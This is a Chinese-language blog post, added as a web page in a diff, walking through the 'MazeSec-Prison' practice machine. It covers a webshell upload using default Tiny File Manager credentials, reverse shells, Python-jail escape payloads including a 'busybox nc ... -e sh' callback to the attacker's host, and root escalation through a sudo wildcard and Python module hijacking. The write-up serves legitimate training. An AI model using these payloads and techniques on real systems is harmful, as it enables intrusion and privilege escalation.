@@ -1,0 +1,221 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>MazeSec-Prison | BoPo's Blog</title><meta name="author" content="BoPo"><meta name="copyright" content="BoPo"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="端口扫描12345678910# Nmap 7.95 scan initiated Fri Mar  6 21:07:11 2026 as: &#x2F;usr&#x2F;lib&#x2F;nmap&#x2F;nmap -p- -oA ports 192.168.43.10Nmap scan report for Prison (192.168.43.10)Host is up (0.00053s latency).Not shown:">
+<meta property="og:type" content="article">
+<meta property="og:title" content="MazeSec-Prison">
+<meta property="og:url" content="http://andeli123.github.io/2026/03/07/MazeSec-Prison/index.html">
+<meta property="og:site_name" content="BoPo&#39;s Blog">
+<meta property="og:description" content="端口扫描12345678910# Nmap 7.95 scan initiated Fri Mar  6 21:07:11 2026 as: &#x2F;usr&#x2F;lib&#x2F;nmap&#x2F;nmap -p- -oA ports 192.168.43.10Nmap scan report for Prison (192.168.43.10)Host is up (0.00053s latency).Not shown:">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://andeli123.github.io/img/weixin.jpg">
+<meta property="article:published_time" content="2026-03-06T16:00:00.000Z">
+<meta property="article:modified_time" content="2026-03-07T10:54:46.228Z">
+<meta property="article:author" content="BoPo">
+<meta property="article:tag" content="pyjail">
+<meta property="article:tag" content="模块劫持">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://andeli123.github.io/img/weixin.jpg"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "MazeSec-Prison",
+  "url": "http://andeli123.github.io/2026/03/07/MazeSec-Prison/",
+  "image": "http://andeli123.github.io/img/weixin.jpg",
+  "datePublished": "2026-03-06T16:00:00.000Z",
+  "dateModified": "2026-03-07T10:54:46.228Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "BoPo",
+      "url": "http://andeli123.github.io"
+    }
+  ]
+}</script><link rel="shortcut icon" href="../../../../img/letter-b.svg"><link rel="canonical" href="http://andeli123.github.io/2026/03/07/MazeSec-Prison/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="../../../../css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":true,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"未找到符合您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'MazeSec-Prison',
+  isHighlightShrink: false,
+  isToc: true,
+  pageType: 'post'
+}</script><meta name="generator" content="Hexo 7.3.0"></head><body><div id="web_bg" style="background-image: url(../../../../img/kalilinux.webp);"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="../../../../img/weixin.jpg" onerror="this.onerror=null;this.src='../../../../img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="../../../../archives/"><div class="headline">文章</div><div class="length-num">27</div></a><a href="../../../../tags/"><div class="headline">标签</div><div class="length-num">48</div></a><a href="../../../../categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="../../../../index.html"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="../../../../archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="../../../../categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="../../../../tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(../../../../img/woman.webp);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="../../../../index.html"><span class="site-name">BoPo's Blog</span></a><a class="nav-page-title" href="../../../../index.html"><span class="site-name">MazeSec-Prison</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  返回首页</span></span></a></span><div id="menus"><div id="search-button"><span class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></span></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="../../../../index.html"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="../../../../archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="../../../../categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="../../../../tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">MazeSec-Prison</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2026-03-06T16:00:00.000Z" title="发表于 2026-03-07 00:00:00">2026-03-07</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2026-03-07T10:54:46.228Z" title="更新于 2026-03-07 18:54:46">2026-03-07</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Nmap 7.95 scan initiated Fri Mar  6 21:07:11 2026 as: /usr/lib/nmap/nmap -p- -oA ports 192.168.43.10</span></span><br><span class="line">Nmap scan report <span class="keyword">for</span> Prison (192.168.43.10)</span><br><span class="line">Host is up (0.00053s latency).</span><br><span class="line">Not shown: 65533 closed tcp ports (reset)</span><br><span class="line">PORT   STATE SERVICE</span><br><span class="line">22/tcp open  ssh</span><br><span class="line">80/tcp open  http</span><br><span class="line">MAC Address: CE:7F:27:86:40:F8 (Unknown)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Nmap done at Fri Mar  6 21:07:12 2026 -- 1 IP address (1 host up) scanned in 1.41 seconds</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="web-渗透"><a href="#web-渗透" class="headerlink" title="web 渗透"></a>web 渗透</h2><p>上 web 页面看了一眼，是个 <code>Tiny File Manager</code>，网上搜索到其默认凭据为 <code>admin:admin@123</code>：</p>
+<p><img src="image1.webp" alt="image1"></p>
+<p>于是用这个用户名密码登录：</p>
+<p><img src="image2.webp" alt="image2"></p>
+<p>可以看到有个上传文件的地方，上传一个木马上去，接着尝试出网页存在 <code>uploads</code> 路径，再结合上传的文件名，就可以进行命令执行了：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/HMV/prison]</span><br><span class="line">└─$ curl -G <span class="string">&#x27;http://192.168.43.10/uploads/test.php&#x27;</span> --data-urlencode <span class="string">&#x27;cmd=id&#x27;</span>   </span><br><span class="line">uid=65534(nobody) gid=65534(nobody) <span class="built_in">groups</span>=65534(nobody)</span><br></pre></td></tr></table></figure>
+
+<p>进行反弹 shell 即可：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/HMV/prison]</span><br><span class="line">└─$ nc -nvlp 1234</span><br><span class="line">Listening on 0.0.0.0 1234</span><br><span class="line">Connection received on 192.168.43.10 37795</span><br><span class="line">python3 -c <span class="string">&quot;import pty;pty.spawn(&#x27;/bin/sh&#x27;)&quot;</span></span><br><span class="line">/var/www/localhost/uploads $ </span><br></pre></td></tr></table></figure>
+
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>我们现在是 nobody 用户，在 home 目录下存在 aristore 用户，我们无法访问其家目录。</p>
+<p>在 <code>/opt/jail/</code> 目录下发现了属于 aristore 用户的 <code>jail.log</code> 和 <code>jail.py</code> ，<code>jail.py</code> 我们不可读， <code>jail.log</code> 里面写着这个程序开在了 9999 端口：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/opt/jail $ <span class="built_in">head</span> jail.log</span><br><span class="line">2026-03-06 21:06:36,212 - MainThread - INFO - Server started on 127.0.0.1:9999</span><br></pre></td></tr></table></figure>
+
+<p>于是用 nc 访问本地的 9999 端口，返回了如下的内容：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/opt/jail $ nc 127.0.0.1 9999</span><br><span class="line">nc 127.0.0.1 9999</span><br><span class="line">=== Python Jail ===</span><br><span class="line">Enter password:</span><br></pre></td></tr></table></figure>
+
+<p>这是一个 <code>pyjail</code> ，让我们输入密码，输入错误的密码就会输出密码错误，然后记录在 <code>jail.log</code> 里面。</p>
+<p>我的想法是输入一些脏数据进行尝试，以及同时建立很多个连接，看它会不会把一部分的源代码给报错输出在 <code>jail.log</code> 里面。但尝试了很多次之后，只能泄漏一些无关紧要的代码片段。</p>
+<p>于是我想着在靶机内部寻找密码，最终在 <code>/etc/profile</code> 中找到了一个密码：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> PATH=<span class="string">&quot;/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">export</span> PAGER=less</span><br><span class="line"><span class="built_in">umask</span> 022</span><br><span class="line"></span><br><span class="line"><span class="comment"># use nicer PS1 for bash and busybox ash</span></span><br><span class="line"><span class="keyword">if</span> [ -n <span class="string">&quot;<span class="variable">$BASH_VERSION</span>&quot;</span> -o <span class="string">&quot;<span class="variable">$BB_ASH_VERSION</span>&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">        PS1=<span class="string">&#x27;\h:\w\$ &#x27;</span></span><br><span class="line"><span class="comment"># use nicer PS1 for zsh</span></span><br><span class="line"><span class="keyword">elif</span> [ -n <span class="string">&quot;<span class="variable">$ZSH_VERSION</span>&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">        PS1=<span class="string">&#x27;%m:%~%# &#x27;</span></span><br><span class="line"><span class="comment"># set up fallback default PS1</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">        : <span class="string">&quot;<span class="variable">$&#123;HOSTNAME:=$(hostname)&#125;</span>&quot;</span></span><br><span class="line">        PS1=<span class="string">&#x27;$&#123;HOSTNAME%%.*&#125;:$PWD&#x27;</span></span><br><span class="line">        [ <span class="string">&quot;<span class="subst">$(id -u)</span>&quot;</span> -eq 0 ] &amp;&amp; PS1=<span class="string">&quot;<span class="variable">$&#123;PS1&#125;</span># &quot;</span> || PS1=<span class="string">&quot;<span class="variable">$&#123;PS1&#125;</span>\$ &quot;</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> script <span class="keyword">in</span> /etc/profile.d/*.sh ; <span class="keyword">do</span></span><br><span class="line">        <span class="keyword">if</span> [ -r <span class="string">&quot;<span class="variable">$script</span>&quot;</span> ] ; <span class="keyword">then</span></span><br><span class="line">                . <span class="string">&quot;<span class="variable">$script</span>&quot;</span></span><br><span class="line">        <span class="keyword">fi</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"><span class="built_in">unset</span> script</span><br><span class="line"><span class="built_in">export</span> ENTRYPWD=OTA4YmY5OTBiMGMz</span><br></pre></td></tr></table></figure>
+
+<p><code>/etc/profile</code> 是 Linux 系统中一个全局的 shell 配置文件，主要用于设置所有用户登录时的环境变量、启动程序或定义系统级的默认行为。</p>
+<p>用这个密码去尝试登录刚才的程序，登录成功了：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">/etc $ nc 127.0.0.1 9999</span><br><span class="line">nc 127.0.0.1 9999</span><br><span class="line">=== Python Jail ===</span><br><span class="line">Enter password: OTA4YmY5OTBiMGMz</span><br><span class="line">OTA4YmY5OTBiMGMz</span><br><span class="line">Password correct! Enter Python Eval (<span class="built_in">type</span> <span class="string">&#x27;exit&#x27;</span> to quit)</span><br><span class="line">&gt;&gt;&gt; 1+1</span><br><span class="line">1+1</span><br><span class="line">Result: 2</span><br><span class="line">&gt;&gt;&gt; import os</span><br><span class="line">import os</span><br><span class="line">Blocked! No cheating.</span><br></pre></td></tr></table></figure>
+
+<p>是个 <code>pyjail</code> ，有一些黑名单，用以下的 payload 可以读取文件：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; [ x <span class="keyword">for</span> x <span class="keyword">in</span> <span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__() <span class="keyword">if</span> x.__name__==<span class="string">&quot;FileLoader&quot;</span> ][0].get_data(0,<span class="string">&quot;/home/aristore/user.txt&quot;</span>)</span><br><span class="line">[ x <span class="keyword">for</span> x <span class="keyword">in</span> <span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__() <span class="keyword">if</span> x.__name__==<span class="string">&quot;FileLoader&quot;</span> ][0].get_data(0,<span class="string">&quot;/home/aristore/user.txt&quot;</span>)</span><br><span class="line">Result: b<span class="string">&#x27;flag&#123;user-3656dc8cdb26771dc5df08ed83cc7487&#125;\n&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>用如下的 payload 可以进行命令执行：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>[ x.__init__.__globals__ <span class="keyword">for</span> x <span class="keyword">in</span> <span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__() <span class="keyword">if</span> x.__name__[:<span class="number">5</span>]==<span class="string">&quot;_wrap&quot;</span>][<span class="number">0</span>][<span class="string">&#x27;sy&#x27;</span>+<span class="string">&#x27;stem&#x27;</span>](<span class="string">&#x27;busybox nc 192.168.43.153 4567 -e sh&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>原本的 payload 是这样的：<code>[ x.__init__.__globals__ for x in &#39;&#39;.__class__.__base__.__subclasses__() if x.__name__==&quot;_wrap_close&quot;][0][&quot;system&quot;](&quot;ls&quot;)</code> 。</p>
+<p>接着我们在自己的 4567 端口收到了弹回来的 shell ：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ nc -nvlp 4567</span><br><span class="line">Listening on 0.0.0.0 4567</span><br><span class="line">Connection received on 192.168.43.10 35617</span><br><span class="line"><span class="built_in">whoami</span></span><br><span class="line">aristore</span><br><span class="line">python3 -c <span class="string">&quot;import pty;pty.spawn(&#x27;/bin/sh&#x27;)&quot;</span></span><br><span class="line">/ $ <span class="built_in">ls</span></span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line">bin         etc         media       root        sys</span><br><span class="line">boot        home        mnt         run         tmp</span><br><span class="line">dev         lib         opt         sbin        usr</span><br><span class="line">empty       lost+found  proc        srv         var</span><br><span class="line">/ $ <span class="built_in">cd</span> </span><br><span class="line"><span class="built_in">cd</span> </span><br><span class="line">~ $ <span class="built_in">ls</span></span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line">user.txt</span><br><span class="line">~ $ <span class="built_in">cat</span> user.txt</span><br><span class="line"><span class="built_in">cat</span> user.txt</span><br><span class="line">flag&#123;user-3656dc8cdb26771dc5df08ed83cc7487&#125;</span><br></pre></td></tr></table></figure>
+
+<p><code>sudo -l</code> 查看我们能 sudo 执行什么：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">~ <span class="variable">$sudo</span> -l</span><br><span class="line"><span class="built_in">sudo</span> -l</span><br><span class="line">Matching Defaults entries <span class="keyword">for</span> aristore on Prison:</span><br><span class="line">   </span><br><span class="line">    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin</span><br><span class="line"></span><br><span class="line">Runas and Command-specific defaults <span class="keyword">for</span> aristore:</span><br><span class="line">    Defaults!/usr/sbin/visudo env_keep+=<span class="string">&quot;SUDO_EDITOR EDITOR VISUAL&quot;</span></span><br><span class="line"></span><br><span class="line">User aristore may run the following commands on Prison:</span><br><span class="line">    (ALL) NOPASSWD: /usr/bin/python3 -m http.server -d /tmp -b *</span><br></pre></td></tr></table></figure>
+
+<p>我们可以启动一个 <code>http.server</code> ，测试他估计需要比较好的交互性，我们先尝试进行 ssh 登录来提高交互性。</p>
+<p>把 kali 的公钥写入到 <code>/home/aristore/.ssh/authorized_keys</code> ：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">~/.ssh $ <span class="built_in">echo</span> <span class="string">&#x27;ssh-ed25519 AAAAC3XXXXXXXXXX kali@kali&#x27;</span> &gt; authorized_keys</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;ssh-ed25519 AAAAC3XXXXXXXXXX kali@kali&#x27;</span> &gt; authorized_keys</span><br><span class="line">~/.ssh $ <span class="built_in">ls</span></span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line">authorized_keys</span><br></pre></td></tr></table></figure>
+
+<p>接着进行 ssh 登录：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/.ssh]</span><br><span class="line">└─$ ssh aristore@192.168.43.10</span><br><span class="line">Enter passphrase <span class="keyword">for</span> key <span class="string">&#x27;/home/kali/.ssh/id_ed25519&#x27;</span>: </span><br><span class="line">              _                          </span><br><span class="line">__      _____| | ___ ___  _ __ ___   ___ </span><br><span class="line">\ \ /\ / / _ \ |/ __/ _ \| <span class="string">&#x27;_ ` _ \ / _ \</span></span><br><span class="line"><span class="string"> \ V  V /  __/ | (_| (_) | | | | | |  __/</span></span><br><span class="line"><span class="string">  \_/\_/ \___|_|\___\___/|_| |_| |_|\___|</span></span><br><span class="line"><span class="string">                                         </span></span><br><span class="line"><span class="string">Prison:~$ whoami</span></span><br><span class="line"><span class="string">aristore</span></span><br><span class="line"><span class="string">Prison:~$ </span></span><br></pre></td></tr></table></figure>
+
+<h3 id="重定根目录"><a href="#重定根目录" class="headerlink" title="重定根目录"></a>重定根目录</h3><p>我们现在可以 sudo 执行 <code>/usr/bin/python3 -m http.server -d /tmp -b *</code>，最后 <code>*</code> 表示我们可以在这个命令后面加任何东西，所以我们可以直接 <code>sudo /usr/bin/python3 -m http.server -d /tmp -b 0.0.0.0 -d /root</code> 来重新指定 web 的根目录为 <code>/root</code> ，这样我们就可以进入到 <code>/root</code> 目录去读取 root flag 了：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Prison:~/test$ <span class="built_in">sudo</span> /usr/bin/python3 -m http.server -d /tmp -b 0.0.0.0 -d /root 8001</span><br><span class="line">Serving HTTP on 0.0.0.0 port 8001 (http://0.0.0.0:8001/) ...</span><br><span class="line">192.168.43.153 - - [07/Mar/2026 15:02:27] <span class="string">&quot;GET / HTTP/1.1&quot;</span> 200 -</span><br><span class="line">192.168.43.153 - - [07/Mar/2026 15:02:32] <span class="string">&quot;GET /.ssh/ HTTP/1.1&quot;</span> 200 -</span><br><span class="line">192.168.43.153 - - [07/Mar/2026 15:02:35] <span class="string">&quot;GET /root.txt HTTP/1.1&quot;</span> 200 -</span><br></pre></td></tr></table></figure>
+
+<p><img src="image3.webp" alt="image3"></p>
+<p>root flag 为：</p>
+<p><code>flag&#123;root-41798091cdc86c8dab1813303dfc064c&#125;</code></p>
+<h3 id="模块劫持"><a href="#模块劫持" class="headerlink" title="模块劫持"></a>模块劫持</h3><p>当然，我们也可以进行 <code>模块劫持</code> 来进行任意命令执行。</p>
+<p>python3 在 <code>-m</code> 进行模块执行的时候，会优先从当前所在目录进行搜索，如果有相应的模块文件，就会直接执行。</p>
+<p>所以我们可以在 <code>/tmp</code> 目录下创建一个 <code>http</code> 文件夹，在里面创建好 <code>__init__.py</code> 和 <code>server.py</code> ，在 <code>server.py</code> 里面写入我们想要执行的命令，就可以达到模块劫持的目的。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">Prison:/tmp$ <span class="built_in">ls</span></span><br><span class="line">http                             sess_qm5r69lq4ddehhdsiejtcn65ib  success.txt</span><br><span class="line">Prison:/tmp$ <span class="built_in">cd</span> http</span><br><span class="line">Prison:/tmp/http$ <span class="built_in">echo</span> <span class="string">&#x27;&#x27;</span> &gt; __init__.py</span><br><span class="line">Prison:/tmp/http$ vim server.py</span><br><span class="line">Prison:/tmp/http$ <span class="built_in">cat</span> server.py </span><br><span class="line">import os</span><br><span class="line">os.system(<span class="string">&#x27;/bin/sh&#x27;</span>)</span><br><span class="line">Prison:/tmp/http$ <span class="built_in">cd</span> ..</span><br><span class="line">Prison:/tmp$ <span class="built_in">sudo</span> python3 -m http.server -d /tmp -b 127.0.0.1</span><br><span class="line">/tmp <span class="comment"># whoami</span></span><br><span class="line">root</span><br><span class="line">/tmp <span class="comment"># cd /root</span></span><br><span class="line">~ <span class="comment"># ls</span></span><br><span class="line">root.txt</span><br><span class="line">~ <span class="comment"># cat root.txt</span></span><br><span class="line">flag&#123;root-41798091cdc86c8dab1813303dfc064c&#125;</span><br><span class="line">~ <span class="comment"># </span></span><br></pre></td></tr></table></figure>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="http://andeli123.github.io">BoPo</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="http://andeli123.github.io/2026/03/07/MazeSec-Prison/">http://andeli123.github.io/2026/03/07/MazeSec-Prison/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="http://andeli123.github.io" target="_blank">BoPo's Blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" 